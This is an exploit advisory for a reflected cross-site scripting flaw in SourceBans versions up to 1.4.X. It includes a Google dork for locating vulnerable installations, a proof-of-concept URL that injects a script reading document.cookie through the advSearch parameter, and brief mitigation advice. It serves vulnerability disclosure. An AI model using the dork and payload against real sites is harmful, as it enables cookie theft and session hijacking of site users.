@@ -1,0 +1,21 @@
+# Exploit Title: SourceBans Version <= 1.4.X Cross-Site Scripting
+# Google Dork: intext:"Powered by SourceMod" intext:"By GameConnect.net" intext:"Version 1.4."
+# Date: 2/16/17
+# Exploit Author: papi / https://github.com/D4stiny
+# Vendor Homepage: https://www.gameconnect.net/projects/sourcebans/
+# Software Link: https://github.com/GameConnect/SourceBans
+# Version: <= 1.4.X
+# Tested on: Firefox
+# CVE : N/A
+
+== ABOUT ==
+Hello, I'm a developer for TangoWorldWide.net. While doing a security audit I was shocked to find that direct GET parameters were being placed directly into HTML. This caused me to take action. At this time I have contacted Peace-Maker, the web developer of SourceBans with the vulnerability. 
+
+== Proof-of-Concept ==
+To test this on your web server simply go to:
+http(s)://[HOSTURL]/index.php?advSearch=24"><script>prompt(document.cookie)</script>&advType=where_banned&p=banlist
+
+== Prevention ==
+Due to the large amounts of inputs not being filtered the best I can suggest is to host SourceBans in a subdomain to prevent users cookies to be stolen.
+
+There are several more vulnerabilities up to the web developer to find. I simply do not have the time to find and post each one.
